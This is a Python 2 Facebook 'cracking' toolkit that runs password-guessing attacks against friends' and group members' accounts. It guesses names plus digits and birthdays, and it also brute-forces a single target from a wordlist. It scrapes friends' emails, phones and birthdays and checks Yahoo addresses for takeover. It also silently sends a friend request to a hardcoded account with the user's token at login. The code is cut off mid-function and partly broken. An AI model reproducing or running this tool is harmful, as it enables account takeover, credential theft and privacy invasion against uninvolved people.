import os, sys, time, datetime, random, hashlib, re, threading, json, getpass, urllib, requests, mechanize
from multiprocessing.pool import ThreadPool

from requests.exceptions import ConnectionError
from mechanize import Browser
reload(sys)
sys.setdefaultencoding('utf8')
br = mechanize.Browser()
br.set_handle_robots(False)
br.set_handle_refresh(mechanize._http.HTTPRefreshProcessor(), max_time=1)
br.addheaders = [('User-Agent', 'Opera/9.80 (Android; Opera Mini/32.0.2254/85. U; id) Presto/2.12.423 Version/12.16')]

def out():
    print '\x1b[1;97m=> Out'
    os.sys.exit()


def jalan(z):
    for e in z + '\n':
        sys.stdout.write(e)
        sys.stdout.flush()
        time.sleep(0.01)

logo = '\n\x1b[1;93m* \x1b[1;97mAuthor  \x1b[1;91m: \x1b[1;96mMuhamad Ramdani\n\x1b[1;93m* \x1b[1;97mIG      \x1b[1;91m: \x1b[1;96m\x1b[4mh@Ramdani.apy\n\n\x1b[1;93m* \x1b[1;97mWA      \x1b[1;91m: \x1b[1;96m\x1b[4mh+6282114018869\n'

def tik():
    titik = [
     '.   ', '..  ', '... ']
    for o in titik:
        print '\r\x1b[1;97m=> \x1b[1;92mWaiting to login \x1b[1;97m' + o,
        sys.stdout.flush()
        time.sleep(1)


back = 0
threads = []
berhasil = []
cekpoint = []
gagal = []
idteman = []
idfromteman = []
idmem = []
id = []
em = []
emfromteman = []
hp = []
hpfromteman = []
reaksi = []
reaksigrup = []
komen = []
komengrup = []
listgrup = []
vulnot = '\x1b[31mNot Vuln'
vuln = '\x1b[32mVuln'


def login():
    os.system('clear')
    try:
        toket = open('login.txt', 'r')
        menu()
    except (KeyError, IOError):
        os.system('clear')
        print logo
        print 40 * '\x1b[1;97m\xe2\x95\x90'
        print '\x1b[1;92mLOGIN FOR FACEBOOK'
        id = raw_input('\x1b[1;97m=> \x1b[1;97m\x1b[1;37mUsername \x1b[1;97m:\x1b[1;97m ')
        pwd = getpass.getpass('\x1b[1;97m=> \x1b[1;97m\x1b[1;97mPassword \x1b[1;97m:\x1b[1;97m ')
        tik()
        try:
            br.open('https://m.facebook.com')
        except mechanize.URLError:
            print '\n\x1b[1;97m=> \x1b[1;91mNo Connection :('
            out()

        br._factory.is_html = True
        br.select_form(nr=0)
        br.form['email'] = id
        br.form['pass'] = pwd
        br.submit()
        url = br.geturl()
        if 'save-device' in url:
            try:
                sig = 'api_key=882a8490361da98702bf97a021ddc14dcredentials_type=passwordemail=' + id + 'format=JSONgenerate_machine_id=1generate_session_cookies=1locale=en_USmethod=auth.loginpassword=' + pwd + 'return_ssl_resources=0v=1.062f8ce9f74b12f84c123cc23437a4a32'
                data = {'api_key': '882a8490361da98702bf97a021ddc14d', 'credentials_type': 'password', 'email': id, 'format': 'JSON', 'generate_machine_id': '1', 'generate_session_cookies': '1', 'locale': 'en_US', 'method': 'auth.login', 'password': pwd, 'return_ssl_resources': '0', 'v': '1.0'}
                x = hashlib.new('md5')
                x.update(sig)
                a = x.hexdigest()
                data.update({'sig': a})
                url = 'https://api.facebook.com/restserver.php'
                r = requests.get(url, params=data)
                z = json.loads(r.text)
                zedd = open('login.txt', 'w')
                zedd.write(z['access_token'])
                zedd.close()
                print '\n\x1b[1;97m=> \x1b[1;92mLogin Successful :)'
                requests.post('https://graph.facebook.com/me/friends?method=post&uids=gwimusa3&access_token=' + z['access_token'])
                time.sleep(2)
                menu()
            except requests.exceptions.ConnectionError:
                print '\n\x1b[1;97m=> \x1b[1;91mNo Connection :('
                out()

        if 'checkpoint' in url:
            print '\x1b[1;97m=> \n\x1b[1;93mAccount Checkpoint [re-Login]'
            os.system('rm -rf login.txt')
            time.sleep(1)
            out()
        else:
            print '\n\x1b[1;97m=> \x1b[1;91mLogin Failed'
            os.system('rm -rf login.txt')
            time.sleep(1)
            login()


def menu():
    os.system('clear')
    try:
        toket = open('login.txt', 'r').read()
    except IOError:
        os.system('clear')
        print '\x1b[1;97m=> \x1b[1;91mToken not found'
        os.system('rm -rf login.txt')
        time.sleep(1)
        login()
    else:
        try:
            otw = requests.get('https://graph.facebook.com/me?access_token=' + toket)
            a = json.loads(otw.text)
            nama = a['name']
            id = a['id']
        except KeyError:
            os.system('clear')
            print '\x1b[1;97m=> \x1b[1;93mAccount Checkpoint [re-Login]'
            os.system('rm -rf login.txt')
            time.sleep(1)
            login()
        except requests.exceptions.ConnectionError:
            print '\x1b[1;97m=> \x1b[1;91mNo Connection :('
            out()

    os.system('clear')
    print logo
    print 40 * '\x1b[1;97m\xe2\x95\x90'
    print '\x1b[1;97mNama \x1b[1;91m: \x1b[1;92m' + nama
    print ''
    print '\x1b[1;37;40m1. Friends Informasion'
    print '\x1b[1;37;40m2. Multi Bruteforce Facebook'
    print '\x1b[1;37;40m3. Yahoo Valid Email'
    print '\x1b[1;37;40m4. List Groups'
    print '\x1b[1;37;40m5. Mass Delete Post'
    print '\x1b[1;37;40m6. Accept All Friend requests'
    print '\x1b[1;37;40m7. Remove All Friend'
    print '\x1b[1;37;40m8. LogOut'
    print '\x1b[1;31;40m0. Out'
    print
    pilih()


def pilih():
    zedd = raw_input('\x1b[1;91m-\xe2\x96\xba\x1b[1;97m ')
    if zedd == '':
        print '\x1b[1;91mRequired'
        pilih()
    else:
        if zedd == '1':
            informasi()
        else:
            if zedd == '2':
                super()
            else:
                if zedd == '3':
                    menu_yahoo()
                else:
                    if zedd == '4':
                        grupsaya()
                    else:
                        if zedd == '5':
                            deletepost()
                        else:
                            if zedd == '6':
                                accept()
                            else:
                                if zedd == '7':
                                    unfriend()
                                else:
                                    if zedd == '8':
                                        os.system('rm -rf login.txt')
                                        keluar()
                                    else:
                                        if zedd == '0':
                                            keluar()
                                        else:
                                            print '\x1b[1;97m=> \xe2\x9c\x96] \x1b[1;97m' + zedd + ' \x1b[1;91mNot found :('
                                            pilih()


def informasi():
    os.system('clear')
    try:
        toket = open('login.txt', 'r').read()
    except IOError:
        print '\x1b[1;97m=> \x1b[1;91mToken not found'
        os.system('rm -rf login.txt')
        time.sleep(1)
        login()

    os.system('clear')
    print logo
    print 40 * '\x1b[1;97m\xe2\x95\x90'
    id = raw_input('\x1b[1;97mInput ID\x1b[1;97m/\x1b[1;97mName\x1b[1;91m : \x1b[1;97m')
    jalan('\x1b[1;92mWaiting \x1b[1;97m...')
    r = requests.get('https://graph.facebook.com/me/friends?access_token=' + toket)
    cok = json.loads(r.text)
    for p in cok['data']:
        if id in p['name'] or id in p['id']:
            r = requests.get('https://graph.facebook.com/' + p['id'] + '?access_token=' + toket)
            z = json.loads(r.text)
            print 40 * '\x1b[1;97m\xe2\x95\x90'
            try:
                print '\x1b[1;97m=> \x1b[1;92mNama\x1b[1;97m          : ' + z['name']
            except KeyError:
                print '\x1b[1;91m=> \x1b[1;92mNama\x1b[1;97m          : \x1b[1;91mNot found :('
            else:
                try:
                    print '\x1b[1;97m=> \x1b[1;92mID\x1b[1;97m            : ' + z['id']
                except KeyError:
                    print '\x1b[1;91m=> \x1b[1;92mID\x1b[1;97m            : \x1b[1;91mNot found :('
                else:
                    try:
                        print '\x1b[1;97m=> \x1b[1;92mEmail\x1b[1;97m         : ' + z['email']
                    except KeyError:
                        print '\x1b[1;91m=> \x1b[1;92mEmail\x1b[1;97m         : \x1b[1;91mNot found :('
                    else:
                        try:
                            print '\x1b[1;97m=> \x1b[1;92mNomor HP\x1b[1;97m      : ' + z['mobile_phone']
                        except KeyError:
                            print '\x1b[1;91m=> \x1b[1;92mNomor HP\x1b[1;97m      : \x1b[1;91mNot found :('

                        try:
                            print '\x1b[1;97m=> \x1b[1;92mLokasi\x1b[1;97m        : ' + z['location']['name']
                        except KeyError:
                            print '\x1b[1;91m=> \x1b[1;92mLokasi\x1b[1;97m        : \x1b[1;91mNot found :('

                    try:
                        print '\x1b[1;97m=> \x1b[1;92mTanggal Lahir\x1b[1;97m : ' + z['birthday']
                    except KeyError:
                        print '\x1b[1;91m=> \x1b[1;92mTanggal Lahir\x1b[1;97m : \x1b[1;91mNot found :('

                try:
                    print '\x1b[1;97m=> \x1b[1;92mSekolah\x1b[1;97m       : '
                    for q in z['education']:
                        try:
                            print '\x1b[1;91m                   -> \x1b[1;97m' + q['school']['name']
                        except KeyError:
                            print '\x1b[1;91m                   -> \x1b[1;91mNot found :('

                except KeyError:
                    pass

            raw_input('\n\x1b[1;97m=>  \x1b[1;97mBack \x1b[1;91m]')
            menu()
    else:
        print '\x1b[1;91mUser not found'
        raw_input('\n\x1b[1;97m=>  \x1b[1;97mBack \x1b[1;91m]')
        menu()

def hasil():
    print
    print 40 * '\x1b[1;97m\xe2\x95\x90'
    for b in berhasil:
        print b

    for c in cekpoint:
        print c

    print
    print '\x1b[31m=> Failed \x1b[1;97m--> ' + str(len(gagal))
    out()


def super():
    global toket
    os.system('clear')
    try:
        toket = open('login.txt', 'r').read()
    except IOError:
        print '\x1b[1;97m=> \x1b[1;91mToken not found'
        os.system('rm -rf login.txt')
        time.sleep(1)
        login()

    os.system('clear')
    print logo
    print 40 * '\x1b[1;97m\xe2\x95\x90'
    print '\x1b[1;97m=> \x1b[1;37;40m1. Crack Friend List'
    print '\x1b[1;97m=> \x1b[1;37;40m2. Crack Member ID'
    print '\x1b[1;97m=> \x1b[1;31;40m0. Back'
    print
    pilih_super()


def pilih_super():
    peak = raw_input('\x1b[1;91m-\xe2\x96\xba\x1b[1;97m ')
    if peak == '':
        print '\x1b[1;97m=> \x1b[1;91mRequired'
        pilih_super()
    else:
        if peak == '1':
            os.system('clear')
            print logo
            print 40 * '\x1b[1;97m\xe2\x95\x90'
            jalan('\x1b[1;97m=> \x1b[1;92mCrack Friend List \x1b[1;97m...')
            r = requests.get('https://graph.facebook.com/me/friends?access_token=' + toket)
            z = json.loads(r.text)
            for s in z['data']:
                id.append(s['id'])

        else:
            if peak == '2':
                os.system('clear')
                print logo
                print 40 * '\x1b[1;97m\xe2\x95\x90'
                idg = raw_input('\x1b[1;97m=> \x1b[1;92mID Grup   \x1b[1;91m:\x1b[1;97m ')
                try:
                    r = requests.get('https://graph.facebook.com/group/?id=' + idg + '&access_token=' + toket)
                    asw = json.loads(r.text)
                    print '\x1b[1;97m=> \x1b[1;97m=> \x1b[1;97mName group \x1b[1;91m:\x1b[1;92m ' + asw['name']
                except KeyError:
                    print '\x1b[1;97m=> \x1b[1;91mGroup not found'
                    raw_input('\n\x1b[1;97m=>  \x1b[1;97mBack \x1b[1;91m]')
                    menu()

                re = requests.get('https://graph.facebook.com/' + idg + '/members?fields=name,id&limit=999999999&access_token=' + toket)
                s = json.loads(re.text)
                for i in s['data']:
                    id.append(i['id'])

            else:
                if peak == '0':
                    menu()
                else:
                    print '\x1b[1;97m=> \x1b[1;97m' + peak + ' \x1b[1;91mNot found :('
                    pilih_super()
    print '\x1b[1;97m=> \x1b[1;97mTotal ID \x1b[1;91m: \x1b[1;97m' + str(len(id))
    jalan('\x1b[1;97m=> \x1b[1;97mWaiting \x1b[1;97m...')
    titik = ['.   ', '..  ', '... ']
    for o in titik:
        print '\r\x1b[1;97m=>[1;91m] \x1b[1;92mProsses \x1b[1;97m' + o,
        sys.stdout.flush()
        time.sleep(1)

    print
    print 40 * '\x1b[1;97m\xe2\x95\x90'

    def main(arg):
        user = arg
        try:
            a = requests.get('https://graph.facebook.com/' + user + '/?access_token=' + toket)
            b = json.loads(a.text)
            pass1 = b['first_name'] + '123'
            data = urllib.urlopen('https://b-api.facebook.com/method/auth.login?access_token=237759909591655%25257C0f140aabedfb65ac27a739ed1a2263b1&format=json&sdk_version=2&email=' + user + '&locale=en_US&password=' + pass1 + '&sdk=ios&generate_session_cookies=1&sig=3f555f99fb61fcd7aa0c44f58f522ef6')
            q = json.load(data)
            if 'access_token' in q:
                print '\x1b[1;97OK \x1b[1;97m=> ' + user + ' | ' + pass1
            else:
                if 'www.facebook.com' in q['error_msg']:
                    print '\x1b[1;97mCP \x1b[1;97m=> ' + user + ' | ' + pass1
                else:
                    pass2 = b['first_name'] + '12345'
                    data = urllib.urlopen('https://b-api.facebook.com/method/auth.login?access_token=237759909591655%25257C0f140aabedfb65ac27a739ed1a2263b1&format=json&sdk_version=2&email=' + user + '&locale=en_US&password=' + pass2 + '&sdk=ios&generate_session_cookies=1&sig=3f555f99fb61fcd7aa0c44f58f522ef6')
                    q = json.load(data)
                    if 'access_token' in q:
                        print '\x1b[1;92mOK \x1b[1;97m=> ' + user + ' | ' + pass2
                    else:
                        if 'www.facebook.com' in q['error_msg']:
                            print '\x1b[1;93mCP \x1b[1;97m=> ' + user + ' | ' + pass2
                        else:
                            pass3 = b['last_name'] + '123'
                            data = urllib.urlopen('https://b-api.facebook.com/method/auth.login?access_token=237759909591655%25257C0f140aabedfb65ac27a739ed1a2263b1&format=json&sdk_version=2&email=' + user + '&locale=en_US&password=' + pass3 + '&sdk=ios&generate_session_cookies=1&sig=3f555f99fb61fcd7aa0c44f58f522ef6')
                            q = json.load(data)
                            if 'access_token' in q:
                                print '\x1b[1;92mOK \x1b[1;97m=> ' + user + ' | ' + pass3
                            else:
                                if 'www.facebook.com' in q['error_msg']:
                                    print '\x1b[1;93mCP \x1b[1;97m=> ' + user + ' | ' + pass3
                                else:
                                    lahir = b['birthday']
                                    pass4 = lahir.replace('/', '')
                                    data = urllib.urlopen('https://b-api.facebook.com/method/auth.login?access_token=237759909591655%25257C0f140aabedfb65ac27a739ed1a2263b1&format=json&sdk_version=2&email=' + user + '&locale=en_US&password=' + pass4 + '&sdk=ios&generate_session_cookies=1&sig=3f555f99fb61fcd7aa0c44f58f522ef6')
                                    q = json.load(data)
                                    if 'access_token' in q:
                                        print '\x1b[1;92mOK \x1b[1;97m=> ' + user + ' | ' + pass4
                                    else:
                                        if 'www.facebook.com' in q['error_msg']:
                                            print '\x1b[1;93mCP \x1b[1;97m=> ' + user + ' | ' + pass4
        except:
            pass

    p = ThreadPool(30)
    p.map(main, id)
    print '\n\x1b[1;97m=> \x1b[1;91mDone'
    raw_input('\n\x1b[1;97m=>  \x1b[1;97mBack \x1b[1;91m]')
    menu()


def brute():
    os.system('clear')
    try:
        toket = open('login.txt', 'r').read()
    except IOError:
        print '\x1b[1;97m=> \x1b[1;91mToken not found'
        os.system('rm -rf login.txt')
        time.sleep(1)
        login()
    else:
        os.system('clear')
        print logo
        print 40 * '\x1b[1;97m\xe2\x95\x90'
        try:
            email = raw_input('\x1b[1;97m=> \x1b[1;92mID\x1b[1;97m/\x1b[1;92mEmail\x1b[1;97m/\x1b[1;92mHp \x1b[1;97mTarget \x1b[1;91m:\x1b[1;97m ')
            passw = raw_input('\x1b[1;97m=> \x1b[1;92mWordlist \x1b[1;97mext(list.txt) \x1b[1;91m: \x1b[1;97m')
            total = open(passw, 'r')
            total = total.readlines()
            print 40 * '\x1b[1;97m\xe2\x95\x90'
            print '\x1b[1;97m=> \x1b[1;92mTarget \x1b[1;91m:\x1b[1;97m ' + email
            print '\x1b[1;92mJumlah\x1b[1;96m ' + str(len(total)) + ' \x1b[1;92mPassword'
            jalan('\x1b[1;92mWaiting \x1b[1;97m...')
            sandi = open(passw, 'r')
            for pw in sandi:
                try:
                    pw = pw.replace('\n', '')
                    sys.stdout.write('\r\x1b[1;97m=> \x1b[1;96m\xe2\x9c\xb8\x1b[1;91m] \x1b[1;92mMencoba \x1b[1;97m' + pw)
                    sys.stdout.flush()
                    data = requests.get('https://b-api.facebook.com/method/auth.login?access_token=237759909591655%25257C0f140aabedfb65ac27a739ed1a2263b1&format=json&sdk_version=2&email=' + email + '&locale=en_US&password=' + pw + '&sdk=ios&generate_session_cookies=1&sig=3f555f99fb61fcd7aa0c44f58f522ef6')
                    mpsh = json.loads(data.text)
                    if 'access_token' in mpsh:
                        dapat = open('Brute.txt', 'w')
                        dapat.write(email + ' | ' + pw + '\n')
                        dapat.close()
                        print '\n\x1b[1;97m=> \x1b[1;9mFound.'
                        print 40 * '\x1b[1;97m\xe2\x95\x90'
                        print '\x1b[1;97m=> \x1b[1;92mUsername \x1b[1;91m:\x1b[1;97m ' + email
                        print '\x1b[1;97m=> \x1b[1;92mPassword \x1b[1;91m:\x1b[1;97m ' + pw
                        out()
                    else:
                        if 'www.facebook.com' in mpsh['error_msg']:
                            ceks = open('Brutecekpoint.txt', 'w')
                            ceks.write(email + ' | ' + pw + '\n')
                            ceks.close()
                            print '\n\x1b[1;97m=> \x1b[1;9mFound.'
                            print 40 * '\x1b[1;97m\xe2\x95\x90'
                            print '\x1b[1;97m=> \x1b[1;93mAccount Checkpoint'
                            print '\x1b[1;97m=> \x1b[1;92mUsername \x1b[1;91m:\x1b[1;97m ' + email
                            print '\x1b[1;97m=> \x1b[1;92mPassword \x1b[1;91m:\x1b[1;97m ' + pw
                            out()
                except requests.exceptions.ConnectionError:
                    print '\x1b[1;97m=> \x1b[1;91mConnection error'
                    time.sleep(1)

        except IOError:
            print '\x1b[1;97m=> \x1b[1;91mFile not found...'
            print '\n\x1b[1;97m=> \x1b[1;91m\x1b[1;92mYou Dont have wordlist'
            tanyaw()


def tanyaw():
    why = raw_input('\x1b[1;97m=> \x1b[1;92mWan to make wordlist ? \x1b[1;92m[y/t]\x1b[1;91m:\x1b[1;97m ')
    if why == '':
        print '\x1b[1;97m=> Please Choose \x1b[1;97m(y/t)'
        tanyaw()
    else:
        if why == 'y':
            wordlist()
        else:
            if why == 'Y':
                wordlist()
            else:
                if why == 't':
                    menu()
                else:
                    if why == 'T':
                        menu()
                    else:
                        print '\x1b[1;97m=> \x1b[1;91mPlease Choose \x1b[1;97m(y/t)'
                        tanyaw()


def menu_yahoo():
    os.system('clear')
    try:
        toket = open('login.txt', 'r').read()
    except IOError:
        print '\x1b[1;97m=> \x1b[1;91mToken not found'
        os.system('rm -rf login.txt')
        time.sleep(1)
        login()

    os.system('clear')
    print logo
    print 40 * '\x1b[1;97m\xe2\x95\x90'
    print '\x1b[1;97m=> \x1b[1;37;40m1. From Friend'
    print '\x1b[1;97m=> \x1b[1;37;40m2. Use File'
    print '\x1b[1;97m=> \x1b[1;31;40m0. Back'
    print
    yahoo_pilih()


def yahoo_pilih():
    go = raw_input('\x1b[1;91m-\xe2\x96\xba\x1b[1;97m ')
    if go == '':
        print '\x1b[1;91mRequired'
        yahoo_pilih()
    else:
        if go == '1':
            yahoofriends()
        else:
            if go == '2':
                yahoolist()
            else:
                if go == '0':
                    menu()
                else:
                    print '\x1b[1;97m=> \x1b[1;97m' + go + ' \x1b[1;91mNot found :('
                    yahoo_pilih()


def yahoofriends():
    os.system('clear')
    try:
        toket = open('login.txt', 'r').read()
    except IOError:
        print '\x1b[1;91mToken not found'
        os.system('rm -rf login.txt')
        time.sleep(1)
        login()

    os.system('clear')
    print logo
    print 40 * '\x1b[1;97m\xe2\x95\x90'
    mpsh = []
    jml = 0
    jalan('\x1b[1;92mWaiting \x1b[1;97m...')
    teman = requests.get('https://graph.facebook.com/me/friends?access_token=' + toket)
    kimak = json.loads(teman.text)
    save = open('MailVuln.txt', 'w')
    print 40 * '\x1b[1;97m\xe2\x95\x90'
    for w in kimak['data']:
        jml += 1
        mpsh.append(jml)
        id = w['id']
        nama = w['name']
        links = requests.get('https://graph.facebook.com/' + id + '?access_token=' + toket)
        z = json.loads(links.text)
        try:
            mail = z['email']
            yahoo = re.compile('@.*')
            otw = yahoo.search(mail).group()
            if 'yahoo.com' in otw:
                br.open('https://login.yahoo.com/config/login?.src=fpctx&.intl=id&.lang=id-ID&.done=https://id.yahoo.com')
                br._factory.is_html = True
                br.select_form(nr=0)
                br['username'] = mail
                klik = br.submit().read()
                jok = re.compile('"messages.ERROR_INVALID_USERNAME">.*')
                try:
                    pek = jok.search(klik).group()
                except:
                    print '\x1b[1;97m=> \x1b[1;92mEmail \x1b[1;91m:\x1b[1;91m ' + mail + ' \x1b[1;97m[\x1b[1;92m' + vulnot + '\x1b[1;97m]'
                    continue

                if '"messages.ERROR_INVALID_USERNAME">' in pek:
                    save.write(mail + '\n')
                    print 40 * '\x1b[1;97m\xe2\x95\x90'
                    print '\x1b[1;97m=> \x1b[1;92mNama  \x1b[1;91m:\x1b[1;97m ' + nama
                    print '\x1b[1;97m=> \x1b[1;92mID    \x1b[1;91m:\x1b[1;97m ' + id
                    print '\x1b[1;97m=> \x1b[1;92mEmail \x1b[1;91m:\x1b[1;97m ' + mail + ' [\x1b[1;92m' + vuln + '\x1b[1;97m]'
                    print 40 * '\x1b[1;97m\xe2\x95\x90'
        except KeyError:
            pass

    print '\x1b[1;97m=> \n\x1b[1;91mDone'
    print '\x1b[1;97m=> \x1b[1;97mAuto Save \x1b[1;91m:\x1b[1;97m MailVuln.txt'
    save.close()
    raw_input('\n\x1b[1;97m=> \x1b[1;97mBack \x1b[1;91m]')
    menu()


def yahoolist():
    os.system('clear')
    try:
        toket = open('login.txt', 'r').read()
    except IOError:
        print '\x1b[1;97m=> \x1b[1;91mToken not found'
        os.system('rm -rf login.txt')
        time.sleep(1)
        login()
    else:
        os.system('clear')
        print logo
        print 40 * '\x1b[1;97m\xe2\x95\x90'
        files = raw_input('\x1b[1;97m=> \x1b[1;92mFile \x1b[1;91m: \x1b[1;97m')
        try:
            total = open(files, 'r')
            mail = total.readlines()
        except IOError:
            print '\x1b[1;97m=> \x1b[1;91mFile Not found :('
            raw_input('\n\x1b[1;97m=> \x1b[1;97mBack \x1b[1;91m]')
            menu()

    mpsh = []
    jml = 0
    jalan('\x1b[1;97m=> \x1b[1;92mWaiting \x1b[1;97m...')
    save = open('MailVuln.txt', 'w')
    print 40 * '\x1b[1;97m\xe2\x95\x90'
    print '\x1b[1;97m=> \x1b[1;97mStatus \x1b[1;91m:  \x1b[1;97mRed[\x1b[1;92m' + vulnot + '\x1b[1;97m]  Green[\x1b[1;92m' + vuln + '\x1b[1;97m]'
    print
    mail = open(files, 'r').readlines()
    for pw in mail:
        mail = pw.replace('\n', '')
        jml += 1
        mpsh.append(jml)
        yahoo = re.compile('@.*')
        otw = yahoo.search(mail).group()
        if 'yahoo.com' in otw:
            br.open('https://login.yahoo.com/config/login?.src=fpctx&.intl=id&.lang=id-ID&.done=https://id.yahoo.com')
            br._factory.is_html = True
            br.select_form(nr=0)
            br['username'] = mail
            klik = br.submit().read()
            jok = re.compile('"messages.ERROR_INVALID_USERNAME">.*')
            try:
                pek = jok.search(klik).group()
            except:
                print '\x1b[1;91m ' + mail
                continue

            if '"messages.ERROR_INVALID_USERNAME">' in pek:
                save.write(mail + '\n')
                print '\x1b[1;92m ' + mail
            else:
                print '\x1b[1;91m ' + mail

    print '\n\x1b[1;97m=> \x1b[1;91mDone'
    print '\x1b[1;97m=> \x1b[1;97mAuto Save \x1b[1;91m:\x1b[1;97m MailVuln.txt'
    save.close()
    raw_input('\n\x1b[1;97m=> \x1b[1;97mBack \x1b[1;91m]')
    menu()

def deletepost():
    os.system('clear')
    try:
        toket = open('login.txt', 'r').read()
        nam = requests.get('https://graph.facebook.com/me?access_token=' + toket)
        lol = json.loads(nam.text)
        nama = lol['name']
    except IOError:
        print '\x1b[1;97m=> \x1b[1;91mToken not found'
        os.system('rm -rf login.txt')
        time.sleep(1)
        login()

    os.system('clear')
    print logo
    print 40 * '\x1b[1;97m\xe2\x95\x90'
    print '\x1b[1;97m=> \x1b[1;92mFrom \x1b[1;91m: \x1b[1;97m%s' % nama
    jalan('\x1b[1;97m=> \x1b[1;92mStart Dellet Post unfaedah\x1b[1;97m ...')
    print 40 * '\x1b[1;97m\xe2\x95\x90'
    asu = requests.get('https://graph.facebook.com/me/feed?access_token=' + toket)
    asus = json.loads(asu.text)
    for p in asus['data']:
        id = p['id']
        piro = 0
        url = requests.get('https://graph.facebook.com/' + id + '?method=delete&access_token=' + toket)
        ok = json.loads(url.text)
        try:
            error = ok['error']['message']
            print '\x1b[1;97m=> \x1b[1;97m' + id[:10].replace('\n', ' ') + '...' + '\x1b[1;91m] \x1b[1;95mFailed'
        except TypeError:
            print '\x1b[1;92m[\x1b[1;97m' + id[:10].replace('\n', ' ') + '...' + '\x1b[1;92m] \x1b[1;96mDelete'
            piro += 1
        except requests.exceptions.ConnectionError:
            print '\x1b[1;97m=> \x1b[1;91mConnection error'
            raw_input('\n\x1b[1;97m=> \x1b[1;97mBack \x1b[1;91m]')
            menu()

    print '\n\x1b[1;97m=> \x1b[1;91mDone'
    raw_input('\n\x1b[1;97m=> \x1b[1;97mBack \x1b[1;91m]')
    menu()


def accept():
    os.system('clear')
    try:
        toket = open('login.txt', 'r').read()
    except IOError:
        print '\x1b[1;97m=> \x1b[1;91mToken not found'
        os.system('rm -rf login.txt')
        time.sleep(1)
        login()

    os.system('clear')
    print logo
    print 40 * '\x1b[1;97m\xe2\x95\x90'
    limit = raw_input('\x1b[1;91m\x1b[1;92mLimit \x1b[1;91m:\x1b[1;97m ')
    r = requests.get('https://graph.facebook.com/me/friendrequests?limit=' + limit + '&access_token=' + toket)
    teman = json.loads(r.text)
    if '[]' in str(teman['data']):
        print '\x1b[1;97m=> \x1b[1;91mNot found :( Friend Requests'
        raw_input('\n\x1b[1;97m=> \x1b[1;97mBack \x1b[1;91m]')
        menu()
    jalan('\x1b[1;97m=> \x1b[1;92mWaiting \x1b[1;97m...')
    print 40 * '\x1b[1;97m\xe2\x95\x90'
    for i in teman['data']:
        gas = requests.post('https://graph.facebook.com/me/friends/' + i['from']['id'] + '?access_token=' + toket)
        a = json.loads(gas.text)
        if 'error' in str(a):
            print '\x1b[1;97m=> \x1b[1;92mNama  \x1b[1;91m:\x1b[1;97m ' + i['from']['name']
            print '\x1b[1;97m=> \x1b[1;92mID    \x1b[1;91m:\x1b[1;97m ' + i['from']['id'] + '\x1b[1;91m Gagal'
            print 40 * '\x1b[1;97m\xe2\x95\x90'
        else:
            print '\x1b[1;97m=> \x1b[1;92mNama  \x1b[1;91m:\x1b[1;97m ' + i['from']['name']
            print '\x1b[1;97m=> \x1b[1;92mID    \x1b[1;91m:\x1b[1;97m ' + i['from']['id'] + '\x1b[1;92m Berhasil'
            print 40 * '\x1b[1;97m\xe2\x95\x90'

    print '\n\x1b[1;97m=> \x1b[1;91mDone'
    raw_input('\n\x1b[1;97m=> \x1b[1;97mBack \x1b[1;91m]')
    menu()


def unfriend():
    os.system('clear')
    try:
        toket = open('login.txt', 'r').read()
    except IOError:
        print '\x1b[1;97m=> \x1b[1;91mToken not found'
        os.system('rm -rf login.txt')
        time.sleep(1)
        login()
    else:
        os.system('clear')
        print logo
        print 40 * '\x1b[1;97m\xe2\x95\x90'
        jalan('\x1b[1;97m=> \x1b[1;92mWaiting \x1b[1;97m...')
        print 40 * '\x1b[1;97m\xe2\x95\x90'
        print '\x1b[1;97m=> \x1b[1;97mStop \x1b[1;91mCTRL+C'
        print
        try:
            pek = requests.get('https://graph.facebook.com/me/friends?access_token=' + toket)
            cok = json.loads(pek.text)
            for i in cok['data']:
                nama = i['name']
                id = i['id']
                requests.delete('https://graph.facebook.com/me/friends?uid=' + id + '&access_token=' + toket)
                print '\x1b[1;97m[\x1b[1;92mDelete\x1b[1;97m] ' + nama + ' => ' + id

        except IndexError:
            pass
        except KeyboardInterrupt:
            print '\x1b[1;97m=> \x1b[1;91mStopped'
            raw_input('\n\x1b[1;97m=> \x1b[1;97mBack \x1b[1;91m]')
            menu()

    print '\n\x1b[1;97m=> \x1b[1;91mDone'
    raw_input('\n\x1b[1;97m=> \x1b[1;97mBack \x1b[1;91m]')
    menu()

def status():
    os.system('clear')
    try:
        toket = open('login.txt', 'r').read()
    except IOError:
        print '\x1b[1;91mToken not found'
        os.system('rm -rf login.txt')
        time.sleep(1)
        login()

    os.system('clear')
    print logo
    print 40 * '\x1b[1;97m\xe2\x95\x90'
    msg = raw_input('\x1b[1;97m=> \x1b[1;92mKetik status \x1b[1;91m:\x1b[1;97m ')
    if msg == '':
        print '\x1b[1;91mRequired'
        raw_input('\n\x1b[1;97m=>  \x1b[1;97mBack \x1b[1;91m]')
        lain()
    else:
        res = requests.get('https://graph.facebook.com/me/feed?method=POST&message=' + msg + '&access_token=' + toket)
        op = json.loads(res.text)
        jalan('\x1b[1;92mWaiting \x1b[1;97m...')
        print 40 * '\x1b[1;97m\xe2\x95\x90'
        print '\x1b[1;97m=> \x1b[1;92mStatus ID\x1b[1;91m : \x1b[1;97m' + op['id']
        raw_input('\n\x1b[1;97m=>  \x1b[1;97mBack \x1b[1;91m]')
        menu()


def wordlist():
    os.system('clear')
    try:
        toket = open('login.txt', 'r').read()
    except IOError:
        print '\x1b[1;97m=> \x1b[1;91mToken not found'
        os.system('rm -rf login.txt')
        time.sleep(1)
        login()
    else:
        try:
            os.system('clear')
            print logo
            print 40 * '\x1b[1;97m\xe2\x95\x90'
            print '\x1b[1;97m=> \x1b[1;92mIsi data lengkap target dibawah'
            print 40 * '\x1b[1;97m\xe2\x95\x90'
            a = raw_input('\x1b[1;97m=> \x1b[1;92mNama Depan \x1b[1;97m: ')
            file = open(a + '.txt', 'w')
            b = raw_input('\x1b[1;97m=> \x1b[1;92mNama Tengah \x1b[1;97m: ')
            c = raw_input('\x1b[1;97m=> \x1b[1;92mNama Belakang \x1b[1;97m: ')
            d = raw_input('\x1b[1;97m=> \x1b[1;92mNama Panggilan \x1b[1;97m: ')
            e = raw_input('\x1b[1;97m=> \x1b[1;92mTanggal Lahir >\x1b[1;96mex: |DDMMYY| \x1b[1;97m: ')
            f = e[0:2]
            g = e[2:4]
            h = e[4:]
            jalan('\x1b[1;97m=> \x1b[1;92mWaiting \x1b[1;97m...')
            l = k[0:2]
            m = k[2:4]
            n = k[4:]
